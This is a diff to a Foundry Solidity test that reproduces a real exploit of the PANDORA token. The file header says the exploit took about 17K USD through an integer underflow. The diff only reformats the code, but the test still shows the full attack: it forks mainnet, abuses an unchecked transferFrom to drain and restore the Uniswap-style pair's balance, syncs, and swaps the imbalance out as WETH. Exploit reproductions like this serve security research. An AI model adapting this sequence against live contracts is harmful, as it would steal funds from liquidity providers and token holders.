@@ -9,10 +9,12 @@ import "./../interface.sol";
 // Profit : ~17K USD
 // REASON : integer underflow
 
-interface NoReturnTransferFrom  {
+interface NoReturnTransferFrom {
     function transfer(address to, uint256 amount) external returns (bool);
     function approve(address spender, uint256 amount) external returns (bool);
-    function balanceOf(address account) external view returns (uint256);
+    function balanceOf(
+        address account
+    ) external view returns (uint256);
     function transferFrom(address sender, address recipient, uint256 amount) external;
 }
 
@@ -23,25 +25,23 @@ contract ContractTest is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() external {
-        cheats.createSelectFork("mainnet", 19184577);
+        cheats.createSelectFork("mainnet", 19_184_577);
         // deal(address(WETH), address(this), 0);
     }
 
     function testExploit() external {
         emit log_named_decimal_uint("[Begin] Attacker WETH before exploit", WETH.balanceOf(address(this)), 18);
         uint256 pandora_balance = PANDORA.balanceOf(address(V2_PAIR));
-        PANDORA.transferFrom(address(V2_PAIR),address(PANDORA),pandora_balance - 1);
+        PANDORA.transferFrom(address(V2_PAIR), address(PANDORA), pandora_balance - 1);
         V2_PAIR.sync();
-        (uint256 ethReserve,uint256 oldPANDORAReserve,) = V2_PAIR.getReserves();
-        PANDORA.transferFrom(address(PANDORA),address(V2_PAIR),pandora_balance - 1);
+        (uint256 ethReserve, uint256 oldPANDORAReserve,) = V2_PAIR.getReserves();
+        PANDORA.transferFrom(address(PANDORA), address(V2_PAIR), pandora_balance - 1);
         uint256 newPANDORAReserve = PANDORA.balanceOf(address(V2_PAIR));
         uint256 amountin = newPANDORAReserve - oldPANDORAReserve;
         uint256 swapAmount = amountin * 9975 * ethReserve / (oldPANDORAReserve * 10_000 + amountin * 9975);
 
         //swap PANDORA to WBNB
-        V2_PAIR.swap(swapAmount,0, address(this), "");
+        V2_PAIR.swap(swapAmount, 0, address(this), "");
         emit log_named_decimal_uint("[End] Attacker WETH after exploit", WETH.balanceOf(address(this)), 18);
     }
-
-
 }
